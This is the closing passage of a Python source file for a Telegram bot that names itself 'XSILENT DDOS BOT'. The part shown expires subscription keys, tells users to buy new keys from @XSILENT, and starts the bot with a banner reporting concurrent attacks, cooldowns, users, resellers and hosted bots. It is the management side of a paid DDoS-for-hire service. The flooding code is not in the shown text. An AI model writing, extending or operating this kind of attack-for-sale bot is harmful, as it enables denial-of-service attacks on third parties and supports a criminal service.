                        bot.send_message(user_id, "⚠️ YOUR ACCESS HAS EXPIRED!\n\nYour subscription period has ended.\nUse /redeem KEY to get new access.\n\nContact @XSILENT to purchase a new key.")
                    except:
                        pass
                
                # Remove expired key
                del keys_data[key]
                save_keys(keys_data)
                print(f"Removed expired key: {key}")
        
        # Clean up old cooldown entries (older than cooldown_time)
        for user_id in list(cooldown.keys()):
            if now - cooldown[user_id] > cooldown_time * 2:
                del cooldown[user_id]

# ========== START BOT ==========
def start_bot():
    print("=" * 50)
    print("🔥 XSILENT DDOS BOT STARTING...")
    print("=" * 50)
    print(f"📊 Bot Token: {BOT_TOKEN[:20]}...")
    print(f"👑 Owner ID: {ADMIN_ID[0]}")
    print(f"⚡ Max Concurrent Attacks: {max_concurrent}")
    print(f"⏳ Cooldown Time: {cooldown_time}s")
    print(f"🔧 Maintenance Mode: {maintenance_mode}")
    print(f"👥 Total Users: {len(users)}")
    print(f"💎 Total Resellers: {len(resellers)}")
    print(f"🔑 Total Keys: {len(keys_data)}")
    print(f"👥 Total Groups: {len(groups)}")
    print(f"🚫 Blocked Users: {blocked_users_collection.count_documents({})}")
    print(f"🤖 Hosted Bots: {hosted_bots_collection.count_documents({})}")
    print("=" * 50)
    print("✅ BOT IS RUNNING!")
    print("=" * 50)
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_attacks, daemon=True)
    cleanup_thread.start()
    
    # Start bot
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except Exception as e:
        print(f"❌ Bot error: {e}")
        time.sleep(5)
        start_bot()

if __name__ == "__main__":
    start_bot()
